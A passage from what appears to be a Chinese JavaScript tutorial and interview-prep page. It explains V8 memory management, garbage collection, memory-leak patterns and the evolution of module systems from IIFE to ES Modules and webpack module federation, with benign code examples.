引擎（V8）在变量声明时自动分配内存，主要分为两类存储区域：</p><p><strong>栈内存（Stack）</strong></p><p>栈内存负责存储基本类型（<code>null</code>、<code>undefined</code>、<code>Symbol</code>、<code>Number</code>、<code>String</code>、<code>Boolean</code>、<code>BigInt</code>）和对象的引用地址，其特点是：</p><ul><li>空间固定（通常 1～10MB），由操作系统直接管理</li><li>分配和回收速度快（通过移动栈指针实现）</li><li>函数执行完毕后，局部变量自动释放</li></ul><p><strong>堆内存（Heap）</strong></p><p>堆内存负责存储引用类型（对象、数组、函数等）的实际数据，其特点是：</p><ul><li>空间动态（64位系统上限约为 1.4GB），由垃圾回收器（GC）管理</li><li>分配与回收成本高，需要避免内存碎片</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 示例：内存分配</span><br><span class="hljs-keyword">let</span> num = <span class="hljs-number">10</span>;          <span class="hljs-comment">// 栈：基本类型</span><br><span class="hljs-keyword">let</span> obj = &#123; <span class="hljs-attr">id</span>: <span class="hljs-number">1</span> &#125;;   <span class="hljs-comment">// 堆：对象数据，栈中存储其引用地址</span><br></code></pre></td></tr></table></figure><h2 id="内存使用规则"><a href="#内存使用规则" class="headerlink" title="内存使用规则"></a>内存使用规则</h2><ul><li>基本类型：直接操作栈内存中的值（按值访问）</li><li>引用类型：通过栈内存中的引用地址操作堆内存中的数据（按引用访问）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> a = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span> &#125;;<br><span class="hljs-keyword">let</span> b = a;  <span class="hljs-comment">// b 复制 a 的引用地址，指向同一堆对象</span><br>b.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Bob&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">name</span>); <span class="hljs-comment">// &quot;Bob&quot;（堆内数据被修改）</span><br></code></pre></td></tr></table></figure><h2 id="垃圾回收算法"><a href="#垃圾回收算法" class="headerlink" title="垃圾回收算法"></a>垃圾回收算法</h2><p>JavaScript 主要使用两种垃圾回收算法：</p><p><strong>标记-清除算法（Mark-and-Sweep）（主流算法）</strong></p><p>工作原理：</p><ul><li>标记阶段：从根对象（全局对象、当前执行栈等）触发，递归标记所有可达对象</li><li>清除阶段：回收所有未被标记的对象</li></ul><p>优点：</p><ul><li>解决了循环引用的问题</li><li>实现相对简单</li></ul><p>缺点：</p><ul><li>可能造成内存碎片</li><li>全堆扫描可能影响性能</li></ul><p>内存碎片的问题可以通过：标记-整理（Mark-Compact）将存活对象移至内存一端</p><p><strong>引用计数算法（Reference Counting）（已淘汰）</strong></p><p>工作原理：</p><ul><li>统计对象被引用的次数，归零时释放</li></ul><p>优点：</p><ul><li>立即回收、内存释放及时</li><li>执行过程分散，没有明显停顿</li></ul><p>缺点：</p><ul><li>无法处理循环引用</li><li>计数器维护开销大</li></ul><p>现代浏览器已不再单独使用引用计数算法</p><h2 id="V8-引擎的垃圾回收机制"><a href="#V8-引擎的垃圾回收机制" class="headerlink" title="V8 引擎的垃圾回收机制"></a>V8 引擎的垃圾回收机制</h2><p><strong>分代式垃圾回收</strong></p><p>V8将堆内存分为两个主要区域：</p><p>新生代：</p><ul><li>存放生存时间短的对象</li><li>容量小（通常 1～8MB）</li><li>回收频繁</li><li>采用 Scavenge 算法（一种复制算法）</li></ul><p>老生代：</p><ul><li>存放生存时间长的对象</li><li>容量大</li><li>回收频率较低</li><li>采用 标记-清除 和 标记-压缩 算法</li></ul><p><strong>回收过程详解</strong></p><p>新生代回收过程：</p><ul><li>将新生代区域分成两个空间：From 和 To</li><li>将对象分配到 From 空间</li><li>当 From 空间满时，标记 From 空间内的活跃对象，并将活跃对象复制到 To 空间，执行垃圾回收清空 From 空间，同时交换 From 空间和 To 空间</li><li>对象经历多次回收晋升为老生代</li></ul><p>老生代回收过程：</p><ul><li>标记阶段：从根对象出发，采用三色标记法（白、灰、黑）标记可达对象</li><li>清除&#x2F;压缩阶段：清除未标记对象或压缩内存消除碎片</li></ul><p><strong>增量标记与惰性清理</strong></p><ul><li>增量标记：将标记过程拆分为多个小任务，与 JavaScript 执行交替进行，避免长时间阻塞主线程</li><li>惰性清理：延迟清理过程，按需清理内存，进一步减少对主线程的影响</li></ul><h2 id="内存泄露与排查"><a href="#内存泄露与排查" class="headerlink" title="内存泄露与排查"></a>内存泄露与排查</h2><p><strong>常见的内存泄露场景</strong></p><p>（1）意外的全局变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">leak</span>(<span class="hljs-params"></span>) &#123;<br>  leakedVar = <span class="hljs-string">&#x27;意外全局&#x27;</span>; <span class="hljs-comment">// 未使用var/let/const</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">leakedProp</span> = <span class="hljs-string">&#x27;意外绑定到全局&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）遗忘的定时器或回调</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> data = <span class="hljs-title function_">fetchData</span>();<br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">process</span>(data); <span class="hljs-comment">// data一直被引用</span><br>&#125;, <span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p>（3）DOM 引用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> elements = &#123;<br>  <span class="hljs-attr">button</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;button&#x27;</span>)<br>&#125;;<br><br><span class="hljs-comment">// 即使从DOM移除，elements.button仍保留引用，需要置空 button 才能解决</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;button&#x27;</span>));<br></code></pre></td></tr></table></figure><p>（4）闭包滥用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createClosure</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> largeObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-string">&#x27;*&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 即使不使用largeObj，它仍被保留</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;closure&#x27;</span>);<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>内存排查工具</strong></p><p>Chrome DevTools：</p><ul><li>Performance 面板：记录内存变化</li><li>Memory 面板：<ul><li>Heap Snapshot：堆内存快照</li><li>Allocations On Timeline：内存分配时间线</li><li>Allocation Sampling：内存分配采样</li></ul></li></ul><p>Node.js 工具：</p><ul><li>process.memoryUsage()</li><li>–inspect 标识启用调试</li><li>heapdump 模块生成堆快照</li></ul><h2 id="性能优化实践"><a href="#性能优化实践" class="headerlink" title="性能优化实践"></a>性能优化实践</h2><p><strong>编程最佳实践</strong></p><p>（1）避免意外全局变量<br>（2）谨慎使用闭包<br>（3）及时清除定时器和事件监听器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;, <span class="hljs-number">1000</span>);<br><span class="hljs-built_in">clearTimeout</span>(timer);<br></code></pre></td></tr></table></figure><p>（4）避免内存密集操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 不佳：频繁创建大对象</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>);<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-comment">// 较佳：复用对象</span><br><span class="hljs-keyword">const</span> dataPool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 复用dataPool</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>对象池模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectPool</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">createFn</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">createFn</span> = createFn;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span> = [];<br>  &#125;<br>  <br>  <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-property">length</span> ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-title function_">pop</span>() : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createFn</span>();<br>  &#125;<br>  <br>  <span class="hljs-title function_">release</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pool</span>.<span class="hljs-title function_">push</span>(obj);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectPool</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000</span>));<br><span class="hljs-keyword">const</span> arr = pool.<span class="hljs-title function_">get</span>();<br><span class="hljs-comment">// 使用后释放</span><br>pool.<span class="hljs-title function_">release</span>(arr);<br></code></pre></td></tr></table></figure><p><strong>WeakMap 和 WeakSet</strong></p><p>WeakMap 和 WeakSet 的键是弱引用，不会阻止 GC 垃圾回收键对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> weakMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br><br>weakMap.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;some data&#x27;</span>);<br>obj = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 现在weakMap中的条目可以被垃圾回收</span><br></code></pre></td></tr></table></figure><h2 id="面试常见问题-5"><a href="#面试常见问题-5" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：JavaScript 是如何管理内存的？</strong></p><p>JavaScript 使用自动垃圾回收机制。主要采用标记-清除算法，V8引擎采用分代回收策略，将堆内存分为新生代和老生代两个区域，分别采用 Scavenge 算法和标记-清除&#x2F;压缩算法</p><p><strong>Q：什么是内存泄露？如何避免？</strong></p><p>内存泄露是指不再被需要的内存未能正确释放。常见的内存泄露场景有：意外的全局变量、游离的 DOM、闭包滥用、未及时清除的定时器&#x2F;事件监听等，可以通过弱引用、对象池、严格模式、及时清理定时器等方法避免</p><p><strong>Q：WeakMap 和 Map 有什么区别？</strong></p><p>WeakMap 的键必须是对象，且是弱引用，不会阻止 GC 垃圾回收器回收键对象；Map 的键可以是任意类型，且保持对键的强引用</p><p><strong>Q：解释下 V8 引擎的回收策略？</strong></p><p>V8 引擎采用分代回收策略，将堆内存分为新生代和老生代两个区域。新生代区域存放小对象、生存时间短的对象，老生代区域存放大对象、生存时间长的对象。新生代采用 Scavenge 算法回收，老生代采用标记-清除&#x2F;压缩算法回收，采用增量标记和惰性清理策略，减少对主线程的影响</p><h1 id="JavaScript模块化机制"><a href="#JavaScript模块化机制" class="headerlink" title="JavaScript模块化机制"></a>JavaScript模块化机制</h1><h2 id="模块化演进史：从混乱到标准化"><a href="#模块化演进史：从混乱到标准化" class="headerlink" title="模块化演进史：从混乱到标准化"></a>模块化演进史：从混乱到标准化</h2><p><strong>原始阶段：全局命名空间污染</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// math.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b, c</span>) &#123; <span class="hljs-keyword">return</span> a + b + c; &#125; <span class="hljs-comment">// 命名冲突</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)); <span class="hljs-comment">// 3 or 6? 结果不可预测</span><br></code></pre></td></tr></table></figure><p><strong>IIFE 模式：初步封装</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 立即执行函数隔离作用域</span><br><span class="hljs-keyword">var</span> calculator = (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">add</span>: add<br>  &#125;;<br>&#125;)();<br><br><span class="hljs-comment">// 使用模块</span><br>calculator.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure><p><strong>CommonJS：Node.js 的模块标准</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// math.js</span><br><span class="hljs-built_in">exports</span>.<span class="hljs-property">add</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b;<br><span class="hljs-built_in">exports</span>.<span class="hljs-property">PI</span> = <span class="hljs-number">3.14159</span>;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./math&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 5</span><br></code></pre></td></tr></table></figure><p><strong>AMD：浏览器异步加载方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用RequireJS</span><br><span class="hljs-title function_">define</span>([<span class="hljs-string">&#x27;dep1&#x27;</span>, <span class="hljs-string">&#x27;dep2&#x27;</span>], <span class="hljs-keyword">function</span>(<span class="hljs-params">dep1, dep2</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">calculate</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> dep1.<span class="hljs-property">value</span> + dep2.<span class="hljs-property">value</span>;<br>    &#125;<br>  &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>UMD：通用模块定义</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 兼容CommonJS和AMD</span><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params">root, factory</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> define === <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; define.<span class="hljs-property">amd</span>) &#123;<br>    <span class="hljs-title function_">define</span>([<span class="hljs-string">&#x27;dep&#x27;</span>], factory);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">exports</span> === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>    <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">factory</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dep&#x27;</span>));<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    root.<span class="hljs-property">myModule</span> = <span class="hljs-title function_">factory</span>(root.<span class="hljs-property">dep</span>);<br>  &#125;<br>&#125;(<span class="hljs-variable language_">this</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">dep</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-comment">/* 模块内容 */</span> &#125;;<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>ES Modules：现代 JavaScript 模块标准</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// math.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">a, b</span>) =&gt; a + b;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">import</span> &#123; add, <span class="hljs-variable constant_">PI</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./math.js&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-variable constant_">PI</span>, <span class="hljs-variable constant_">PI</span>)); <span class="hljs-comment">// 6.28318</span><br></code></pre></td></tr></table></figure><h2 id="ES-Modules-核心机制深度剖析"><a href="#ES-Modules-核心机制深度剖析" class="headerlink" title="ES Modules 核心机制深度剖析"></a>ES Modules 核心机制深度剖析</h2><p><strong>模块加载三阶段</strong></p><pre class="mermaid">graph TD    A[构建 Construction] --> B[解析模块]    B --> C[建立依赖图]    C --> D[实例化 Instantiation]    D --> E[分配内存]    E --> F[建立导入/导出链接]    F --> G[求值 Evaluation]    G --> H[执行顶层代码]</pre><p><strong>实时绑定原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// counter.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params"></span>) &#123; count++; &#125;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">import</span> &#123; count, increment &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./counter.js&#x27;</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 0</span><br><span class="hljs-title function_">increment</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 1 (值实时更新)</span><br></code></pre></td></tr></table></figure><p><strong>循环引用解决方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// a.js</span><br><span class="hljs-keyword">import</span> &#123; b &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./b.js&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> a = <span class="hljs-string">&#x27;A&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;a中获取b:&#x27;</span>, b); <span class="hljs-comment">// &#x27;B&#x27;</span><br><br><span class="hljs-comment">// b.js</span><br><span class="hljs-keyword">import</span> &#123; a &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./a.js&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> b = <span class="hljs-string">&#x27;B&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;b中获取a:&#x27;</span>, a); <span class="hljs-comment">// undefined (但不会报错)</span><br><br><span class="hljs-comment">// ES Modules 处理循环引用的关键：</span><br><span class="hljs-comment">// 1. 构建阶段建立所有导出绑定</span><br><span class="hljs-comment">// 2. 执行阶段按顺序求值</span><br><span class="hljs-comment">// 3. 未初始化变量值为undefined</span><br></code></pre></td></tr></table></figure><h2 id="现代模块系统核心特性对比"><a href="#现代模块系统核心特性对比" class="headerlink" title="现代模块系统核心特性对比"></a>现代模块系统核心特性对比</h2><table><thead><tr><th align="left">特性</th><th align="left">CommonJS</th><th align="left">ES Modules</th></tr></thead><tbody><tr><td align="left">加载方式</td><td align="left">同步加载</td><td align="left">异步加载</td></tr><tr><td align="left">模块解析时机</td><td align="left">运行时</td><td align="left">编译时（静态）</td></tr><tr><td align="left">导出类型</td><td align="left">值拷贝</td><td align="left">实时绑定（引用）</td></tr><tr><td align="left">循环引用处理</td><td align="left">部分支持（可能出错）</td><td align="left">完全支持</td></tr><tr><td align="left">动态导入</td><td align="left">require()动态语法</td><td align="left">import()函数</td></tr><tr><td align="left">顶层 await</td><td align="left">不支持</td><td align="left">支持</td></tr><tr><td align="left">Tree shaking</td><td align="left">困难</td><td align="left">原生支持</td></tr><tr><td align="left">严格模式</td><td align="left">默认非严格模式</td><td align="left">默认严格模式</td></tr></tbody></table><h2 id="高级模块化计数与实践"><a href="#高级模块化计数与实践" class="headerlink" title="高级模块化计数与实践"></a>高级模块化计数与实践</h2><p><strong>动态导入（Code Spliting）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 按需加载模块</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loadBtn&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; heavyOperation &#125; = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./heavyModule.js&#x27;</span>);<br>  <span class="hljs-title function_">heavyOperation</span>();<br>&#125;);<br><br><span class="hljs-comment">// Webpack 自动代码分割</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">LoginModal</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./LoginModal&#x27;</span>));<br></code></pre></td></tr></table></figure><p><strong>模块重导出</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// utils/index.js</span><br><span class="hljs-keyword">export</span> &#123; <span class="hljs-keyword">default</span> <span class="hljs-keyword">as</span> formatDate &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./dateUtils&#x27;</span>;<br><span class="hljs-keyword">export</span> &#123; encrypt, decrypt &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./cryptoUtils&#x27;</span>;<br><br><span class="hljs-comment">// app.js</span><br><span class="hljs-keyword">import</span> &#123; formatDate, encrypt &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils&#x27;</span>; <span class="hljs-comment">// 单一入口</span><br></code></pre></td></tr></table></figure><p><strong>模块联邦（微前端架构）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// app1/webpack.config.js</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;app1&#x27;</span>,<br>  <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;remoteEntry.js&#x27;</span>,<br>  <span class="hljs-attr">exposes</span>: &#123;<br>    <span class="hljs-string">&#x27;./Button&#x27;</span>: <span class="hljs-string">&#x27;./src/components/Button&#x27;</span>,<br>  &#125;,<br>  <span class="hljs-attr">shared</span>: [<span class="hljs-string">&#x27;react&#x27;</span>, <span class="hljs-string">&#x27;react-dom&#x27;</span>],<br>&#125;);<br><br><span class="hljs-comment">// app2/webpack.config.js</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123;<br>  <span class="hljs-attr">remotes</span>: &#123;<br>    <span class="hljs-attr">app1</span>: <span class="hljs-string">&#x27;app1@http://localhost:3001/remoteEntry.js&#x27;</span>,<br>  &#125;,<br>&#125;);<br><br><span class="hljs-comment">// app2 中使用远程模块</span><br><span 